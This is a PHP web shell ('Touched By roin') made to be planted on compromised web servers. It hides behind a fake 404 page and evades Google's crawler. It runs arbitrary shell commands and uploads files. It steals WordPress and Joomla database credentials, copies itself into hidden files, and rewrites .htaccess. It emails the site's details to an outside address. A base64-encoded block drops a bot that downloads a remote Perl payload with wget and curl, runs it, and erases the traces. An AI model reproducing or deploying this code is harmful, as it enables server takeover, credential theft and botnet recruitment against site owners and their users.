<?php error_reporting(0);
set_time_limit(0);
class roin {
    private $access = array('www-data', 'www', 'apache');
    private $type, $os, $user;
    public function __construct() {
        $this->user = get_current_user();
        $this->os = $this->check("os");
        $this->type = $this->check("cmd");
        if (!isset($_GET['1180'])) {
            if (isset($_GET['x1'])) {
                $this->form();
                echo ($this->os == "windows") ? '<pre>' . $this->exe('dir') . '</pre>' : '<pre>' . $this->exe('ls -la') . '</pre>';
            } else {
                header("HTTP/1.0 404 Not Found");
                header("Status: 404 Not Found");
                echo "<h1>Error 404 Not Found</h1>";
                echo "The page that you have requested could not be found.";
                die();
                exit();
            }
        } else {
            if (isset($_GET['x'])) {
                switch ($_GET['x']) {
                    case 'get':
                        if (isset($_GET['file'])) {
                            $file = urldecode($_GET['file']);
                            $name = (isset($_GET['name'])) ? $_GET['name'] : "px.php";
                            $code = file_get_contents($file);
                            $myfile = fopen($name, "w+");
                            fwrite($myfile, $code);
                            fclose($myfile);
                        }
                    break;
                    case 'plbot':
                        $this->plBot();
                    break;
                    case 'clear':
                        $this->delete("px.php");
                        $this->delete("pl.php");
                    break;
                    case 'read':
                        if (isset($_GET['path'])) {
                            $path = urldecode($_GET['path']);
                            $this->setDB($path);
                        }
                    break;
                    case 'jdb':
                        $this->joomlaDb();
                    break;
                    case 'wpdb':
                        $this->wpDb();
                    break;
                    case 'mail':
                        $mail = (isset($_GET['to'])) ? urldecode($_GET['to']) : "setoran.target26@gmail.com";
                        $host = $_SERVER["HTTP_HOST"];
                        $uri = $_SERVER["REQUEST_URI"];
                        $serv = gethostbyname($_SERVER['SERVER_ADDR']);
                        $addr = gethostbyname($_SERVER['REMOTE_ADDR']);
                        mail($mail, "kiriman bos " . $host . $uri, "Url:" . $host . $uri . " nIp :$servn Ip injector: $addr");
                    break;
                    case 'clone':
                        if (isset($_GET['path'])) {
                            $path = urldecode($_GET['path']);
                            if (strstr($path, ",")) {
                                $data = explode(",", $path);
                                if (is_array($data) && count($data) > 0) {
                                    $data = array_filter($data);
                                    if (count($data) > 0) {
                                        foreach ($data as $k) {
                                            $this->setClone($k);
                                        }
                                    }
                                }
                            } else {
                                $path = urldecode($_GET['path']);
                                $this->setClone($path);
                            }
                        } else {
                            $this->setClone('../.inc.php');
                            $this->setClone('../../.inc.php');
                        }
                    break;
                    case 'patch':
                        $lock = (isset($_GET['lock'])) ? 1 : 0;
                        $force = (isset($_GET['force'])) ? 1 : 0;
                        $path = "";
                        if (isset($_GET['path'])) {
                            $path = urldecode($_GET['path']);
                            if (strstr($path, ",")) {
                                $path = explode(",", $path);
                            }
                        }
                        if (isset($_GET['allow'])) {
                            $files = urldecode($_GET['allow']);
                            if (strstr($files, ",")) {
                                $file = explode(",", $files);
                                $this->setPatch($user, $file, $lock, $path, $force);
                            } else {
                                $this->setPatch($user, $files, $lock, $path, $force);
                            }
                        } else {
                            $this->setPatch($user, "", $lock, $path, $force);
                        }
                    break;
                    case 'chmod':
                        if (isset($_GET['dir'])) {
                            $dir = $_GET['dir'];
                            if ($dir == 1) {
                                chmod("./", 0555);
                            } else if ($dir == 2) {
                                chmod("./", 0555);
                                chmod("../", 0555);
                            } else if ($dir == 3) {
                                chmod("./", 0555);
                                chmod("../", 0555);
                                chmod("../../", 0555);
                            } else {
                                $dir = str_replace("|", "/", $dir);
                                chmod($dir, 0555);
                            }
                        }
                        break;
                    case 'die':
                        $source = $_SERVER['SCRIPT_FILENAME'];
                        @unlink($source);
                        break;
                    }
                } else {
                    if (isset($_GET['del'])) {
                        $del = $_GET['del'];
                        if (strstr($del, ",")) {
                            $data = explode(",", $del);
                            if (is_array($data) && count($data) > 0) {
                                $data = array_filter($data);
                                foreach ($data as $k) {
                                    $this->delete($k);
                                }
                            }
                        } else {
                            $this->delete($del);
                        }
                    }
                    $this->getForm();
                }
        }
    }
    private function plBot() {
        $code = "PD9waHANCiR1cmwgPSAoaXNzZXQoJF9HRVRbJ3VybCddKSkgPyB1cmxkZWNvZGUoJF9HRVRbJ3VybCddKSA6ICJodHRwOi8vd3d3LmhvdGVscmlzdG9yYW50ZWxlcGFudG8uaXQvZm9ybS8vLi4uL3JvYm90LnR4

dCI7DQoNCmlmKGZ1bmN0aW9uX2V4aXN0cygnZXhlYycpKXsNCglAZXhlYygnd2dldCAnLiR1cmwuJyAtTyByb2JvdC50eHQ7cGVybCByb2JvdC50eHQ7cGVybCByb2JvdC50eHQ7cm0gLWZyIHJvYioudHh0Jyk7DQoJQGV

4ZWMoJ2N1cmwgJy4kdXJsLicgLW8gcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3JtIC1mciByb2IqLnR4dCcpOw0KCUBleGVjKCdsd3AtZG93bmxvYWQgLWEgJy4kdXJsLicgcm9ib3QudHh0O3

Blcmwgcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3JtIC1mciByb2IqLnR4dCcpOw0KCUBleGVjKCdseW54IC1zb3VyY2UgJy4kdXJsLicgPiByb2JvdC50eHQ7cGVybCByb2JvdC50eHQ7cGVybCByb2JvdC50eHQ7cm0gL

WZyIHJvYioudHh0Jyk7DQoJQGV4ZWMoJ2ZldGNoIC1vIHJvYm90LnR4dCAnLiR1cmwuJztwZXJsIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtybSAtZnIgcm9iKi50eHQnKTsNCglAZXhlYygnR0VUICcuJHVybC4nID5y

b2JvdC50eHQ7cGVybCByb2JvdC50eHQ7cGVybCByb2JvdC50eHQ7cm0gLWZyIHJvYioudHh0Jyk7DQoJQGV4ZWMoJ3JtIC1yZiByb2IqLnR4dCcpOw0KCUBleGVjKCdjZCAvdG1wO3dnZXQgJy4kdXJsLicgLU8gcm9ib3Q

udHh0O3Blcmwgcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3JtIC1mciByb2IqLnR4dCcpOw0KCUBleGVjKCdjZCAvdG1wO2N1cmwgJy4kdXJsLic7cGVybCByb2JvdC50eHQ7cGVybCByb2JvdC50eHQ7cm0gLWZyIHJvYi

oudHh0Jyk7DQoJQGV4ZWMoJ2NkIC90bXA7bHdwLWRvd25sb2FkIC1hICcuJHVybC4nIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtybSAtZnIgcm9iKi50eHQnKTsNCglAZXhlYygnY2QgL3Rtc

DtseW54IC1zb3VyY2UgJy4kdXJsLicgPiByb2JvdC50eHQ7cGVybCByb2JvdC50eHQ7cGVybCByb2JvdC50eHQ7cm0gLWZyIHJvYioudHh0Jyk7DQoJQGV4ZWMoJ2NkIC90bXA7ZmV0Y2ggLW8gcm9ib3QudHh0ICcuJHVy

bC4nO3Blcmwgcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3JtIC1mciByb2IqLnR4dCcpOw0KCUBleGVjKCdjZCAvdG1wO0dFVCAnLiR1cmwuJyA

+cm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3JtIC1mciByb2IqLnR4dCcpOw0KCUBleGVjKCdybSAtcmYgaW5kZXgucGhwLionKTsNCglAZXhlYygnY2QgL3RtcDtybSAtcmYgcm9iKi50eHQnKT

sNCglAZXhlYygncm0gLXJmIHJvYioudHh0Jyk7DQoJQGV4ZWMoJ2NkIC90bXA7cm0gLXJmIHJvYioudHh0KicpOw0KCUBleGVjKCdybSAtcmYgcm9iKi50eHQqJyk7DQp9IGVsc2VpZihmdW5jdGlvbl9leGlzdHMoJ3NoZ

WxsX2V4ZWMnKSl7DQoJQHNoZWxsX2V4ZWMoJ3dnZXQgJy4kdXJsLicgLU8gcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3JtIC1mciByb2IqLnR4dCcpOw0KCUBzaGVsbF9leGVjKCdjdXJsICcu

JHVybC4nIC1vIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtybSAtZnIgcm9iKi50eHQnKTsNCglAc2hlbGxfZXhlYygnbHdwLWRvd25sb2FkIC1hICcuJHVybC4nIHJvYm90LnR4dDtwZXJsIHJ

vYm90LnR4dDtwZXJsIHJvYm90LnR4dDtybSAtZnIgcm9iKi50eHQnKTsNCglAc2hlbGxfZXhlYygnbHlueCAtc291cmNlICcuJHVybC4nID4gcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3JtIC

1mciByb2IqLnR4dCcpOw0KCUBzaGVsbF9leGVjKCdmZXRjaCAtbyByb2JvdC50eHQgJy4kdXJsLic7cGVybCByb2JvdC50eHQ7cGVybCByb2JvdC50eHQ7cm0gLWZyIHJvYioudHh0Jyk7DQoJQHNoZWxsX2V4ZWMoJ0dFV

CAnLiR1cmwuJyA

+cm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3JtIC1mciByb2IqLnR4dCcpOw0KCUBzaGVsbF9leGVjKCdybSAtcmYgcm9iKi50eHQnKTsNCglAc2hlbGxfZXhlYygnY2QgL3RtcDt3Z2V0ICcuJH

VybC4nIC1PIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtybSAtZnIgcm9iKi50eHQnKTsNCglAc2hlbGxfZXhlYygnY2QgL3RtcDtjdXJsICcuJHVybC4nO3Blcmwgcm9ib3QudHh0O3Blcmwgc

m9ib3QudHh0O3JtIC1mciByb2IqLnR4dCcpOw0KCUBzaGVsbF9leGVjKCdjZCAvdG1wO2x3cC1kb3dubG9hZCAtYSAnLiR1cmwuJyByb2JvdC50eHQ7cGVybCByb2JvdC50eHQ7cGVybCByb2JvdC50eHQ7cm0gLWZyIHJv

YioudHh0Jyk7DQoJQHNoZWxsX2V4ZWMoJ2NkIC90bXA7bHlueCAtc291cmNlICcuJHVybC4nID4gcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3JtIC1mciByb2IqLnR4dCcpOw0KCUBzaGVsbF9

leGVjKCdjZCAvdG1wO2ZldGNoIC1vIHJvYm90LnR4dCAnLiR1cmwuJztwZXJsIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtybSAtZnIgcm9iKi50eHQnKTsNCglAc2hlbGxfZXhlYygnY2QgL3RtcDtHRVQgJy4kdXJsLi

cgPnJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtybSAtZnIgcm9iKi50eHQnKTsNCglAc2hlbGxfZXhlYygnY2QgL3RtcDtybSAtcmYgaW5kZXgucGhwLionKTsNCglAc2hlbGxfZXhlYygnY2QgL

3RtcDtybSAtcmYgcm9iKi50eHQnKTsNCglAc2hlbGxfZXhlYygncm0gLXJmIHJvYioudHh0Jyk7DQoJQHNoZWxsX2V4ZWMoJ2NkIC90bXA7cm0gLXJmIHJvYioudHh0KicpOw0KCUBzaGVsbF9leGVjKCdybSAtcmYgcm9i

Ki50eHQqJyk7DQp9ZWxzZWlmKGZ1bmN0aW9uX2V4aXN0cygnc3lzdGVtJykpew0KCUBzeXN0ZW0oJ3dnZXQgJy4kdXJsLicgLU8gcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3JtIC1mciByb2I

qLnR4dCcpOw0KCUBzeXN0ZW0oJ2N1cmwgJy4kdXJsLicgLW8gcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3JtIC1mciByb2IqLnR4dCcpOw0KCUBzeXN0ZW0oJ2x3cC1kb3dubG9hZCAtYSAnLi

R1cmwuJyByb2JvdC50eHQ7cGVybCByb2JvdC50eHQ7cGVybCByb2JvdC50eHQ7cm0gLWZyIHJvYioudHh0Jyk7DQoJQHN5c3RlbSgnbHlueCAtc291cmNlICcuJHVybC4nID4gcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O

3Blcmwgcm9ib3QudHh0O3JtIC1mciByb2IqLnR4dCcpOw0KCUBzeXN0ZW0oJ2ZldGNoIC1vIHJvYm90LnR4dCAnLiR1cmwuJztwZXJsIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtybSAtZnIgcm9iKi50eHQnKTsNCglA

c3lzdGVtKCdHRVQgJy4kdXJsLic7cGVybCByb2JvdC50eHQ7cGVybCByb2JvdC50eHQ7cm0gLWZyIHJvYioudHh0Jyk7DQoJQHN5c3RlbSgncm0gLXJmIHJvYioudHh0Jyk7DQoJQHN5c3RlbSgnY2QgL3RtcDt3Z2V0ICc

uJHVybC4nIC1PIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtybSAtZnIgcm9iKi50eHQnKTsNCglAc3lzdGVtKCdjZCAvdG1wO2N1cmwgJy4kdXJsLicgLW8gcm9ib3QudHh0O3Blcmwgcm9ib3

QudHh0O3Blcmwgcm9ib3QudHh0O3JtIC1mciByb2IqLnR4dCcpOw0KCUBzeXN0ZW0oJ2NkIC90bXA7bHdwLWRvd25sb2FkIC1hICcuJHVybC4nIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtyb

SAtZnIgcm9iKi50eHQnKTsNCglAc3lzdGVtKCdjZCAvdG1wO2x5bnggLXNvdXJjZSAnLiR1cmwuJyA

+IHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtybSAtZnIgcm9iKi50eHQnKTsNCglAc3lzdGVtKCdjZCAvdG1wO2ZldGNoIC1vIHJvYm90LnR4dCAnLiR1cmwuJztwZXJsIHJvYm90LnR4dDtwZX

JsIHJvYm90LnR4dDtybSAtZnIgcm9iKi50eHQnKTsNCglAc3lzdGVtKCdjZCAvdG1wO0dFVCAnLiR1cmwuJztwZXJsIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtybSAtZnIgcm9iKi50eHQnKTsNCglAc3lzdGVtKCdyb

SAtcmYgcm9iKi50eHQnKTsNCglAc3lzdGVtKCdjZCAvdmFyL3RtcDtybSAtcmYgaW5kZXgucGhwLionKTsNCglAc3lzdGVtKCdjZCAvdG1wO3JtIC1yZiByb2IqLnR4dCcpOw0KCUBzeXN0ZW0oJ2NkIC90bXA7cm0gLXJm

IHJvYioudHh0KicpOw0KfSBlbHNlaWYoZnVuY3Rpb25fZXhpc3RzKCdwYXNzdGhydScpKXsNCglAcGFzc3RocnUoJ3dnZXQgJy4kdXJsLicgLU8gcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3J

tIC1mciByb2IqLnR4dCcpOw0KCUBwYXNzdGhydSgnY3VybCAnLiR1cmwuJyAtbyByb2JvdC50eHQ7cGVybCByb2JvdC50eHQ7cGVybCByb2JvdC50eHQ7cm0gLWZyIHJvYioudHh0Jyk7DQoJQHBhc3N0aHJ1KCdsd3AtZG

93bmxvYWQgLWEgJy4kdXJsLicgcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3JtIC1mciByb2IqLnR4dCcpOw0KCUBwYXNzdGhydSgnbHlueCAtc291cmNlICcuJHVybC4nID4gcm9ib3QudHh0O

3Blcmwgcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3JtIC1mciByb2IqLnR4dCcpOw0KCUBwYXNzdGhydSgnZmV0Y2ggLW8gcm9ib3QudHh0ICcuJHVybC4nIDtwZXJsIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtybSAt

ZnIgcm9iKi50eHQnKTsNCglAcGFzc3RocnUoJ0dFVCAnLiR1cmwuJyA

+cm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3JtIC1mciByb2IqLnR4dCcpOw0KCUBwYXNzdGhydSgncm0gLXJmIHJvYioudHh0Jyk7DQoJQHBhc3N0aHJ1KCdjZCAvdG1wO3dnZXQgJy4kdXJsLi

cgLU8gcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3JtIC1mciByb2IqLnR4dCcpOw0KCUBwYXNzdGhydSgnY2QgL3RtcDtjdXJsICcuJHVybC4nIC1vIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4d

DtwZXJsIHJvYm90LnR4dDtybSAtZnIgcm9iKi50eHQnKTsNCglAcGFzc3RocnUoJ2NkIC90bXA7bHdwLWRvd25sb2FkIC1hICcuJHVybC4nIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtybSAt

ZnIgcm9iKi50eHQnKTsNCglAcGFzc3RocnUoJ2NkIC90bXA7bHlueCAtc291cmNlICcuJHVybC4nID4gcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3Blcmwgcm9ib3QudHh0O3JtIC1mciByb2IqLnR4dCcpOw0KCUBwYXN

zdGhydSgnY2QgL3RtcDtmZXRjaCAtbyByb2JvdC50eHQgJy4kdXJsLic7cGVybCByb2JvdC50eHQ7cGVybCByb2JvdC50eHQ7cm0gLWZyIHJvYioudHh0Jyk7DQoJQHBhc3N0aHJ1KCdjZCAvdG1wO0dFVCAnLiR1cmwuJz

twZXJsIHJvYm90LnR4dDtwZXJsIHJvYm90LnR4dDtybSAtZnIgcm9iKi50eHQnKTsNCglAcGFzc3RocnUoJ3JtIC1yZiBpbmRleC5waHAuKicpOw0KCUBwYXNzdGhydSgncm0gLXJmIHJvYioudHh0Jyk7DQoJQHBhc3N0a

HJ1KCdybSAtcmYgcm9iKi50eHQqJyk7DQp9DQo/Pg==";
        $code2 = base64_decode($code);
        $myfile = fopen("pl.php", "w+");
        fwrite($myfile, $code2);
        fclose($myfile);
    }
    private function check($tipe) {
        if ($tipe == "cmd") {
            $result = 0;
            if (function_exists('passthru')) {
                $result = "passthru";
            } elseif (function_exists('system')) {
                $result = "system";
            } elseif (function_exists('exec')) {
                $result = "exec";
            } elseif (function_exists('shell_exec')) {
                $result = "shell_exec";
            }
        } else {
            $result = "linux";
            if (PHP_OS == "WINNT") {
                $result = "windows";
            } elseif (PHP_OS == "Linux") {
                $result = "linux";
            } elseif (PHP_OS == "FreeBSD") {
                $result = "freebsd";
            }
        }
        return $result;
    }
    private function getForm() {
        $this->form();
        if (isset($_GET['start'])) {
            echo "<form enctype=multipart/form-data action method=POST><b>Upload File</b><br/><input type=hidden name=submit><input type=file name=userfile 

size=28><br><b>New name: </b><input type=text size=15 name=newname class=ta><input type=submit class=bt value=Upload></form>";
            $this->processForm();
            $this->cmd();
        } else {
            $this->cmd();
        }
    }
    private function form() {
        if (strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'google') !== false) {
            header('HTTP/1.0 404 Not Found');
            echo "<h1>Error 404 Not Found</h1>";
            echo "The page that you have requested could not be found.";
            exit();
        }
        $safe = @ini_get('safe_mode');
        $secure = (!$safe) ? "SAFE_MODE : OFF roin" : "SAFE_MODE : ON roin";
        echo "<body style='background:#610680;
        color:#fff;
        font-family:monospace;
        font-size:13px;
        '>";
        echo "<title>Touched By roin</title><br>";
        echo "<b>" . $secure . "</b><br>";
        $cur_user = "(" . $this->user . ")";
        echo "<b>User : uid=" . getmyuid() . $cur_user . " gid=" . getmygid() . $cur_user . "</b><br>";
        echo "<b>Uname : " . php_uname() . "</b><br/>";
    }
    private function processForm() {
        if (isset($_POST['submit'])) {
            $uploaddir = $this->pwd();
            if (!$name = $_POST['newname']) {
                $name = $_FILES['userfile']['name'];
            }
            move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir . $name);
            echo (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir . $name)) ? "!!Upload Failed" : "Success Upload to " . $uploaddir . $name;
        }
    }
    private function pwd() {
        $cwd = getcwd();
        if ($u = strrpos($cwd, '/')) {
            return ($u != strlen($cwd) - 1) ? $cwd . '/' : $cwd;
        } elseif ($u = strrpos($cwd, '/')) {
            if ($u != strlen($cwd) - 1) {
                return $cwd . '/';
            } else {
                return $cwd;
            }
        }
    }
    private function cmd($cmd = false) {
        if ($cmd) {
            echo '<pre>' . $this->exe($cmd) . '</pre>';
        } else {
            if (isset($_GET['q'])) {
                echo '<pre>' . $this->exe($_GET['q']) . '</pre>';
            } else {
                echo ($this->os == "windows") ? '<pre>' . $this->exe('dir') . '</pre>' : '<pre>' . $this->exe('ls -la') . '</pre>';
            }
        }
    }
    private function exe($cmd) {
        $res = '';
        if ($this->type == "exec") {
            @exec($cmd, $res);
            $res = join("n", $res);
        } elseif ($this->type == "shell_exec") {
            $res = @shell_exec($cmd);
        } elseif ($this->type == "system") {
            @ob_start();
            @system($cmd);
            $res = @ob_get_contents();
            @ob_end_clean();
        } elseif ($this->type == "passthru") {
            @ob_start();
            @passthru($cmd);
            $res = @ob_get_contents();
            @ob_end_clean();
        }
        return $res;
    }
    private function setPatch($user, $data, $lock, $path, $force) {
        $create = 1;
        if (!$force) {
            if (in_array($user, $this->access)) {
                $create = 0;
            }
        }
        if ($create) {
            if ($lock) {
                $i = 'deny from all' . PHP_EOL;
            } else {
                $i = '<Files ~ "(?i).(zip|rar|php|php.*|phtml|gif|png|phpgif|asp|asp.*)$">' . PHP_EOL;
                $i.= 'deny from all' . PHP_EOL;
                $i.= '</Files>' . PHP_EOL;
            }
            if (is_array($data)) {
                foreach ($data as $k) {
                    $i.= '<Files "' . $k . '">' . PHP_EOL;
                    $i.= 'Order Allow,Deny' . PHP_EOL;
                    $i.= 'Allow from all' . PHP_EOL;
                    $i.= '</Files>' . PHP_EOL;
                }
            } else {
                if (!empty($data)) {
                    $i.= '<Files "' . $data . '">' . PHP_EOL;
                    $i.= 'Order Allow,Deny' . PHP_EOL;
                    $i.= 'Allow from all' . PHP_EOL;
                    $i.= '</Files>' . PHP_EOL;
                } else {
                    $i.= '<Files "1x.php">' . PHP_EOL;
                    $i.= 'Order Allow,Deny' . PHP_EOL;
                    $i.= 'Allow from all' . PHP_EOL;
                    $i.= '</Files>' . PHP_EOL;
                    $i.= '<Files "string.php">' . PHP_EOL;
                    $i.= 'Order Allow,Deny' . PHP_EOL;
                    $i.= 'Allow from all' . PHP_EOL;
                    $i.= '</Files>' . PHP_EOL;
                }
            }
            if (is_array($path)) {
                foreach ($path as $k) {
                    $file = fopen($k, "w");
                    fwrite($file, $i);
                    fclose($file);
                }
            } else {
                if (!empty($path)) {
                    $file = fopen($path, "w");
                    fwrite($file, $i);
                    fclose($file);
                } else {
                    $file = fopen(".htaccess", "w");
                    fwrite($file, $i);
                    fclose($file);
                }
            }
        }
    }
    private function setDB($file) {
        $read = file_get_contents($file);
        if ($read) {
            echo $read;
        } else {
            echo "Unable to open file";
        }
        exit;
    }
    private function setClone($path) {
        if (file_exists($path)) {
            @unlink($path);
        }
        $source = $_SERVER['SCRIPT_FILENAME'];
        copy($source, $path);
    }
    private function joomlaDb() {
        $p1 = "../../../../../../../";
        $p2 = "../../../../../../";
        $p3 = "../../../../../";
        $p4 = "../../../../";
        $p5 = "../../../";
        $p6 = "../../";
        $p7 = "../";
        $j = file_get_contents($p1 . "configuration.php");
        if (!$j) {
            $j = file_get_contents($p2 . "configuration.php");
            if (!$j) {
                $j = file_get_contents($p3 . "configuration.php");
                if (!$j) {
                    $j = file_get_contents($p4 . "configuration.php");
                    if (!$j) {
                        $j = file_get_contents($p5 . "configuration.php");
                        if (!$j) {
                            $j = file_get_contents($p6 . "configuration.php");
                            if (!$j) {
                                $j = file_get_contents($p7 . "configuration.php");
                                if (!$j) {
                                    $j = file_get_contents("configuration.php");
                                }
                            }
                        }
                    }
                }
            }
        }
        echo $j;
        exit;
    }
    private function wpDb() {
        $p1 = "../../../../../../../";
        $p2 = "../../../../../../";
        $p3 = "../../../../../";
        $p4 = "../../../../";
        $p5 = "../../../";
        $p6 = "../../";
        $p7 = "../";
        $w = file_get_contents($p1 . "wp-config.php");
        if (!$w) {
            $w = file_get_contents($p2 . "wp-config.php");
            if (!$w) {
                $w = file_get_contents($p3 . "wp-config.php");
                if (!$w) {
                    $w = file_get_contents($p4 . "wp-config.php");
                    if (!$w) {
                        $w = file_get_contents($p5 . "wp-config.php");
                        if (!$w) {
                            $w = file_get_contents($p6 . "wp-config.php");
                            if (!$w) {
                                $w = file_get_contents($p7 . "wp-config.php");
                                if (!$w) {
                                    $w = file_get_contents("wp-config.php");
                                }
                            }
                        }
                    }
                }
            }
        }
        echo $w;
        exit;
    }
    private function delete($file) {
        chmod("./", 0755);
        chmod("../", 0755);
        chmod("../../", 0755);
        @unlink($this->pwd() . $file);
        $this->exe('rm -rf ' . $file);
        $this->exe('del ' . $file);
    }
}
new roin();
?>